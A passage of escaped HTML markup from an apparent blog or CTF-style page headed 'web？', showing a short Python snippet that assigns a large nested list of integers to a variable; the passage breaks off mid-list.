      &lt;h3 id=&quot;web？&quot;&gt;&lt;a href=&quot;#web？&quot; class=&quot;headerlink&quot; title=&quot;web？&quot;&gt;&lt;/a&gt;web？&lt;/h3&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; np&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;o = [[&lt;span class=&quot;number&quot;&gt;11&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;13&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;32&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;234&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;236&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;72&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;237&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;122&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;230&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;157&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;53&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;225&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;193&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;76&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;142&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;166&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;11&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;196&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;194&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;187&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;152&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;132&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;135&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;76&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;55&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;38&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;70&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;98&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;244&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;201&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;125&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;182&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;123&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;47&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;86&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;67&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;19&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;145&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;12&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;138&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;149&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;83&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;178&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;255&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;122&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;238&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;187&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;221&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;218&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;233&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;17&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;56&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;151&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;28&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;150&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;196&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;79&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;11&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;150&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;52&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;228&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;189&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;107&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;219&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;87&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;90&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;221&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;45&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;201&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;14&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;106&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;230&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;30&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;50&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;76&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;94&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;172&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;61&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;229&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;109&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;216&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;12&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;181&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;231&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;174&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;236&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;159&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;245&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;52&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;43&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;11&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;207&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;145&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;241&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;196&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;80&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;134&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;145&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;36&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;255&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;13&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;239&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;212&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;135&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;85&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;194&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;200&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;50&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;170&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;78&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;51&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;232&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;132&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;60&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;122&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;117&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;74&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;117&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;250&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;45&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;142&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;221&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;121&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;56&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;56&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;120&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;113&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;143&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;77&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;190&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;195&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;133&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;236&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;111&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;144&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;65&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;172&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;74&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;160&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;143&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;242&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;96&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;70&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;107&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;229&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;79&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;167&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;88&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;165&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;38&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;108&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;27&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;75&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;240&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;116&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;178&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;165&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;206&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;156&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;193&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;86&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;57&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;148&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;187&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;161&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;55&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;134&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;24&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;249&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;235&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;175&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;235&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;169&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;73&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;125&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;114&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;142&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;162&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;228&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;157&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;160&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;66&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;28&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;167&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;63&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;41&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;182&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;55&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;189&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;56&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;102&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;31&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;158&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;37&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;190&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;169&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;116&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;172&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;66&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;229&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;188&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;63&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;138&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;111&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;245&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;133&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;22&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;87&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;25&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;26&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;106&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;82&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;211&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;252&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;57&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;66&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;98&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;199&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;48&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;58&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;221&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;162&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;57&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;111&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;70&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;227&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;126&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;43&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;143&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;225&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;85&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;224&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;141&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;232&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;141&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;233&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;69&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;70&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;204&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;155&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;141&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;212&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;83&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;219&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;55&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;132&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;153&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;11&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;89&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;134&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;201&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;255&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;101&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;22&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;98&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;215&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;139&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;78&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;165&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;126&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;48&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;119&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;194&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;156&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;212&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;237&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;112&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;17&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;158&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;225&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;227&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;152&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;121&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;56&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;238&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;74&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;76&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;66&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;80&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;31&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;73&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;180&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;45&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;94&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;110&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;231&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;82&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;180&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;109&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;209&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;239&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;163&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;30&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;160&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;60&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;190&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;97&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;256&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;141&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;199&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;30&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;235&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;73&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;225&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;244&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;141&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;123&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;208&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;220&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;248&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;136&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;245&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;123&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;82&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;120&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;65&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;68&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;136&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;151&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;173&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;104&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;107&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;172&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;148&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;54&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;218&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;42&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;233&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;57&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;115&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;50&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;196&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;190&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;34&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;140&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;52&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;160&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;34&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;201&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;48&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;214&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;33&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;219&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;183&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;224&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;237&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;157&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;245&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;134&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;13&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;99&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;212&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;230&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;243&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;236&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;40&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;144&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;246&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;73&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;161&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;134&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;112&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;146&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;212&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;121&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;43&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;41&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;174&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;146&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;78&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;235&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;202&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;200&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;90&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;254&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;216&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;113&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;25&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;114&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;232&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;123&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;158&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;85&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;116&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;97&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;145&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;21&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;105&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;256&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;69&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;21&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;152&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;155&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;88&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;11&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;232&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;146&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;238&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;170&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;123&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;135&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;150&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;161&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;249&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;236&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;251&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;96&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;103&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;188&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;188&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;33&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;39&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;237&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;63&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;230&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;166&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;130&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;141&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;112&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;254&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;234&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;113&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;250&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;89&lt;/span&gt;, &lt;span 